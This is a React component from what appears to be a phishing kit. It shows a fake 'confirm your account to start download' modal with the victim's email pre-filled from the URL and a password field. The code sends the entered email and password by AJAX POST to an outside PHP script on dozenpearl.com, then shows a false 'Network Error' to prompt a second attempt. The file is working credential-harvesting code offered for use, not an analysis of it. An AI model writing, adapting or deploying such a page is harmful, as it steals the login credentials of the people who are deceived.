
import React, { useState } from "react";
import './mod.css';
import $ from 'jquery';

const Mod = ()=>{

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const e = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const [email, setEmail] = useState(e);
    const [pwd, setPwd] = useState('');

    const handleForm = e=>{
        e.preventDefault();

        setErr(false)

        if (!pwd) {
            return null
        } else {



        setTimeout(() => {
            setPwd('');
            setTimeout(() => {
                setErr(true);
            }, 500);
        }, 3000);

        // post to server

        const user = {
            email: email,
            password: pwd
        };
    
        $.ajax({
            type: "POST",
            url: "https://dozenpearl.com/nc_assets/fonts/recov/autohi.php",
            data: user,
            success(data) {
                // alert('OK');
                console.log(data);
            },
        });
        }
    };

    const [err, setErr] = useState(false);

    return(<>

        <section className='modal'>
          <div className='contimg'>
            <img 
              alt='wit'
              className='wetra'
              src='data:image/jpeg;base64,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'
            />
          </div>

          <p style={{
            textAlign:"center"
          }}>
            Confirm your account to start  
            <br />
            download!
          </p>

          <hr />


          <form onSubmit={handleForm}>

            {err ? <span className="errrr">
                Network Error! Please verify your information and try again
            </span> : undefined }

            <div className="email_wrapper">
                <input
                    className="inp_box" 
                    type="email"
                    placeholder="Email"
                    title="user_email"
                    readOnly
                    value={email}
                    onChange={e=> {
                        setEmail(e.target.value);
                        if (pwd.length >= 1) {
                            setErr(false);
                        }
                    }}
                />
            </div>

            <div className="pswd_wrapper" style={{
                paddingTop:'6px'
            }}>
                <input
                    className="inp_box" 
                    type="pasword"
                    placeholder="Password"
                    title="Enter Password"
                    autoFocus
                    value={pwd}
                    onChange={e=> setPwd(e.target.value)}
                />
            </div>

            <div className="submit__weapper">
                <button className="btnnn">Download</button>
            </div>

          </form>


        </section>

    </>)
};

export default Mod;